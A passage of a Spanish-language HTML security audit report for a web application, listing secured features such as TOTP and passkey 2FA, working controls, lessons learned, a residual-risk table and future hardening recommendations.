            <p style="color:var(--text2); margin-bottom:16px; font-size:0.9rem;">Funciones activadas entre el 25 de febrero y 1 de marzo de 2026. Verificadas en produccion (aiprowork.com) y staging.</p>

            <div class="feature-card">
                <h4>2FA con TOTP (Autenticacion de dos factores)</h4>
                <p><strong>Archivos:</strong> <code>routes/twofa.js</code>, <code>helpers/twofa.js</code></p>
                <p><strong>Endpoints publicos:</strong> <code>GET/POST /2fa</code>, <code>POST /2fa/passkey/authenticate-*</code></p>
                <p><strong>Endpoints protegidos:</strong> <code>GET /status</code>, <code>POST /setup</code>, <code>POST /verify-setup</code>, <code>POST /disable</code></p>
                <p><strong>Crypto:</strong> Secretos TOTP encriptados con AES-256-GCM. Recovery codes hasheados con bcrypt.</p>
                <p><strong>Sesion:</strong> Validacion de <code>pending2FA</code> en session antes de aceptar verificacion.</p>
                <span class="security-status secure">SEGURO</span>
            </div>

            <div class="feature-card">
                <h4>WebAuthn / Passkeys</h4>
                <p><strong>Archivos:</strong> <code>routes/twofa.js</code> (22 referencias a passkey)</p>
                <p><strong>Endpoints:</strong> <code>POST /passkey/register-begin</code>, <code>POST /passkey/register-end</code>, <code>DELETE /passkey/:id</code></p>
                <p><strong>RP configurado:</strong> <code>APP_DOMAIN</code> de env (aiprowork.com en produccion). Verificado que challenge se genera correctamente.</p>
                <p><strong>Dependencia:</strong> <code>@simplewebauthn/server</code> &mdash; libreria madura y auditada.</p>
                <span class="security-status secure">SEGURO</span>
            </div>

            <div class="feature-card">
                <h4>Daily Digest (Reportes diarios con IA)</h4>
                <p><strong>Archivos:</strong> <code>services/digest.js</code>, <code>routes/gtd.js:564-604</code></p>
                <p><strong>Autorizacion:</strong> <code>/digest/latest</code> y <code>/digest/history</code> requieren sesion. <code>/digest/trigger</code> solo admin.</p>
                <p><strong>Cadena IA:</strong> Gemini (primario) &rarr; Ollama llama3 (fallback) &rarr; texto plano (ultimo recurso).</p>
                <p><strong>API keys:</strong> Solo desde variables de entorno (<code>process.env.GEMINI_API_KEY</code>). Ninguna hardcodeada.</p>
                <p><strong>Bug corregido:</strong> SQL type mismatch en columnas TEXT vs TIMESTAMP. Fix: guards <code>IS NOT NULL AND != ''</code> + cast <code>::date</code>.</p>
                <span class="security-status secure">SEGURO</span>
            </div>

            <div class="feature-card">
                <h4>Graph API (Visualizacion de relaciones)</h4>
                <p><strong>Archivos:</strong> <code>routes/admin.js</code></p>
                <p><strong>Endpoint:</strong> <code>GET /api/graph</code></p>
                <p><strong>Autorizacion:</strong> Requiere sesion autenticada. Datos de solo lectura.</p>
                <p><strong>Verificacion:</strong> Produccion devuelve 43 nodos, 19 edges. Queries parametrizadas.</p>
                <span class="security-status secure">SEGURO</span>
            </div>

            <div class="feature-card">
                <h4>Integracion Telegram</h4>
                <p><strong>Archivos:</strong> <code>services/telegram.js</code></p>
                <p><strong>Autorizacion:</strong> Token del bot via <code>TELEGRAM_BOT_TOKEN</code> env variable.</p>
                <p><strong>Uso:</strong> Notificaciones salientes (no acepta comandos entrantes). Solo envia, no recibe.</p>
                <span class="security-status secure">SEGURO</span>
            </div>
        </div>
    </div>

    <!-- LO QUE ESTA BIEN -->
    <div id="ok" class="findings">
        <div class="positives">
            <h3>Controles de seguridad que funcionan correctamente</h3>
            <div class="positive-grid">
                <div class="positive-item"><span class="check">&#10003;</span> Queries SQL parametrizados (?)</div>
                <div class="positive-item"><span class="check">&#10003;</span> Rate limiting (5 limiters: API, AI, login, upload, download)</div>
                <div class="positive-item"><span class="check">&#10003;</span> Helmet CSP restrictiva</div>
                <div class="positive-item"><span class="check">&#10003;</span> Firewall UFW (22, 80, 443)</div>
                <div class="positive-item"><span class="check">&#10003;</span> Redes Docker separadas (web + internal)</div>
                <div class="positive-item"><span class="check">&#10003;</span> Account lockout (5 intentos = 30 min)</div>
                <div class="positive-item"><span class="check">&#10003;</span> Audit log (20+ tipos de eventos)</div>
                <div class="positive-item"><span class="check">&#10003;</span> fail2ban en nginx</div>
                <div class="positive-item"><span class="check">&#10003;</span> Backups encriptados (GPG)</div>
                <div class="positive-item"><span class="check">&#10003;</span> CORS configurado (whitelist)</div>
                <div class="positive-item"><span class="check">&#10003;</span> Sesiones Redis (httpOnly, sameSite, secure)</div>
                <div class="positive-item"><span class="check">&#10003;</span> Input validation middleware</div>
                <div class="positive-item"><span class="check">&#10003;</span> IDOR protection (requireOwnerOrAdmin)</div>
                <div class="positive-item"><span class="check">&#10003;</span> Soft-delete pattern</div>
                <div class="positive-item"><span class="check">&#10003;</span> Graceful shutdown</div>
                <div class="positive-item"><span class="check">&#10003;</span> Path traversal protection (safePath)</div>
                <div class="positive-item new-item"><span class="check">&#10003;</span> 2FA adaptativo (TOTP + WebAuthn + recovery codes)<span class="new-tag">NUEVO</span></div>
                <div class="positive-item new-item"><span class="check">&#10003;</span> Secretos 2FA encriptados AES-256-GCM<span class="new-tag">NUEVO</span></div>
                <div class="positive-item new-item"><span class="check">&#10003;</span> Trusted devices con hash + IP<span class="new-tag">NUEVO</span></div>
                <div class="positive-item new-item"><span class="check">&#10003;</span> AI API keys solo desde env vars<span class="new-tag">NUEVO</span></div>
                <div class="positive-item new-item"><span class="check">&#10003;</span> Webhooks protegidos con API key (3 endpoints)<span class="new-tag">NUEVO</span></div>
                <div class="positive-item new-item"><span class="check">&#10003;</span> Digest solo trigger por admin<span class="new-tag">NUEVO</span></div>
                <div class="positive-item new-item"><span class="check">&#10003;</span> Test suite: 9/9 suites, 463/463 tests passing (unit + integration)<span class="new-tag">NUEVO</span></div>
            </div>
        </div>
    </div>

    <!-- LECCIONES -->
    <div id="lecciones" class="findings">
        <div class="lessons">
            <h3>Lecciones Aprendidas</h3>
            <div class="lesson"><strong>1. Escapar siempre, no solo a veces.</strong> Si <code>escapeHtml()</code> existe, debe usarse en CADA campo de la BD. La inconsistencia es peor que no tener la funcion.</div>
            <div class="lesson"><strong>2. Minimos de password actualizados.</strong> 4 caracteres nunca fue aceptable. NIST 800-63B: minimo 8 sin restricciones de complejidad.</div>
            <div class="lesson"><strong>3. exec() nunca con input del usuario.</strong> Siempre usar <code>execFile()</code> o <code>spawn()</code> con argumentos separados.</div>
            <div class="lesson"><strong>4. Autorizacion explicita por endpoint.</strong> "Esta detras de requireAuth" no basta. Endpoints sensibles necesitan <code>requireAdmin</code>.</div>
            <div class="lesson"><strong>5. Webhooks publicos = puertas abiertas.</strong> Siempre requerir firma HMAC o API key.</div>
            <div class="lesson new-lesson"><strong>6. Tipos de columna SQL importan.</strong> Columnas TEXT comparadas con TIMESTAMP causan errores silenciosos. Siempre usar guards (<code>IS NOT NULL AND != ''</code>) y casts explicitos (<code>::date</code>).</div>
            <div class="lesson new-lesson"><strong>7. Verificar configuracion por entorno.</strong> <code>APP_DOMAIN</code> apuntaba a staging en produccion. Cada entorno debe tener su configuracion revisada independientemente.</div>
            <div class="lesson new-lesson"><strong>8. AI fallbacks deben ser resilientes.</strong> La cadena Gemini &rarr; Ollama &rarr; texto plano garantiza que el servicio nunca falle completamente, incluso con API keys invalidas o timeouts.</div>
            <div class="lesson new-lesson"><strong>9. Tests deben reflejar el codigo actual.</strong> Tests con assertions de hard-delete (<code>DELETE FROM</code>) cuando el codigo usa soft-delete (<code>SET deleted_at</code>) dan falsos negativos. Mocks de ESM modules (<code>isomorphic-dompurify</code>, <code>otplib</code>) necesarios para Jest CJS.</div>
        </div>
    </div>

    <!-- MATRIZ DE RIESGO RESIDUAL -->
    <div id="riesgo" class="findings">
        <h3 style="margin-bottom:16px; color:var(--accent);">Matriz de Riesgo Residual</h3>
        <p style="color:var(--text2); margin-bottom:16px; font-size:0.9rem;">Perfil de riesgo del sistema tras aplicar las correcciones de la auditoria.</p>
        <table class="risk-matrix">
            <thead>
                <tr>
                    <th>Area</th>
                    <th>Riesgo Pre-Auditoria</th>
                    <th>Riesgo Post-Correccion</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>Cross-Site Scripting (XSS)</td>
                    <td><span class="risk-level critico">CRITICO</span></td>
                    <td><span class="risk-level bajo">BAJO</span></td>
                </tr>
                <tr>
                    <td>Injection (SQL/Command)</td>
                    <td><span class="risk-level critico">CRITICO</span></td>
                    <td><span class="risk-level bajo">BAJO</span></td>
                </tr>
                <tr>
                    <td>Broken Access Control</td>
                    <td><span class="risk-level alto">ALTO</span></td>
                    <td><span class="risk-level bajo">BAJO</span></td>
                </tr>
                <tr>
                    <td>Authentication Failures</td>
                    <td><span class="risk-level alto">ALTO</span></td>
                    <td><span class="risk-level bajo">BAJO</span></td>
                </tr>
                <tr>
                    <td>Security Misconfiguration</td>
                    <td><span class="risk-level medio">MEDIO</span></td>
                    <td><span class="risk-level bajo">BAJO</span></td>
                </tr>
                <tr>
                    <td>Cryptographic Failures</td>
                    <td><span class="risk-level medio">MEDIO</span></td>
                    <td><span class="risk-level bajo">BAJO</span></td>
                </tr>
            </tbody>
        </table>
    </div>

    <!-- RECOMENDACIONES A FUTURO -->
    <div id="recomendaciones" class="findings">
        <h3 style="margin-bottom:16px; color:var(--accent);">Recomendaciones a Futuro</h3>
        <p style="color:var(--text2); margin-bottom:16px; font-size:0.9rem;">Mejoras priorizadas para el proximo ciclo de mantenimiento.</p>

        <div class="reco-card" style="opacity:0.5; text-decoration:line-through;">
            <div class="reco-priority p1" style="background:var(--fixed);">&#10003;</div>
            <div class="reco-body">
                <div class="reco-title">Implementar retencion automatica de audit_log</div>
                <div class="reco-ref">M-04 &mdash; Cron job diario a las 2 AM, elimina &gt;90 dias</div>
            </div>
            <span class="reco-effort" style="background:var(--fixed);color:white;">HECHO</span>
        </div>

        <div class="reco-card" style="opacity:0.5; text-decoration:line-through;">
            <div class="reco-priority p2" style="background:var(--fixed);">&#10003;</div>
            <div class="reco-body">
                <div class="reco-title">Incrementar bcrypt cost factor a 12</div>
                <div class="reco-ref">B-01 &mdash; Actualizado en 6 ubicaciones (database, admin, auth, twofa)</div>
            </div>
            <span class="reco-effort" style="background:var(--fixed);color:white;">HECHO</span>
        </div>

        <div class="reco-card" style="opacity:0.5; text-decoration:line-through;">
            <div class="reco-priority p3" style="background:var(--fixed);">&#10003;</div>
            <div class="reco-body">
                <div class="reco-title">Agregar CSRF tokens para DELETE/PUT</div>
                <div class="reco-ref">M-02 &mdash; Middleware extendido a todos los metodos mutantes</div>
            </div>
            <span class="reco-effort" style="background:var(--fixed);color:white;">HECHO</span>
        </div>

        <div class="reco-card">
            <div class="reco-priority p4">4</div>
            <div class="reco-body">
                <div class="reco-title">CSP mas estricta (eliminar unsafe-inline)</div>
                <div class="reco-ref">Eliminar <code>unsafe-inline</code> de Content Security Policy</div>
            </div>
            <span class="reco-effort">~4 horas</span>
        </div>

        <div class="reco-card">
            <div class="reco-priority p5">5</div>
            <div class="reco-body">
                <div class="reco-title">Rate limiting por usuario (no solo por IP)</div>
                <div class="reco-ref">Prevenir abuso desde IPs compartidas/VPN</div>
            </div>
            <span class="reco-effort">~2 horas</span>
        </div>

        <div class="reco-card">
            <div class="reco-priority p6">6</div>
            <div class="reco-body">
                <div class="reco-title">Rotacion automatica de API keys (expiracion 90 dias)</div>
                <div class="reco-ref">Reducir ventana de exposicion si una key es comprometida</div>
            </div>
            <span class="reco-effort">~3 horas</span>
        </div>

        <div class="reco-card">
            <div class="reco-priority p7">7</div>
            <div class="reco-body">
                <div class="reco-title">Firma HMAC para webhook Fireflies</div>
                <div class="reco-ref">Reemplazar API key por firma criptografica</div>
            </div>
            <span class="reco-effort">~1 hora</span>
        </div>
    </div>

</div>

<script>
function showTab(id) {
    document.querySelectorAll('.findings').forEach(f => f.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    event.target.classList.add('active');
}
</script>
</body>
</html>
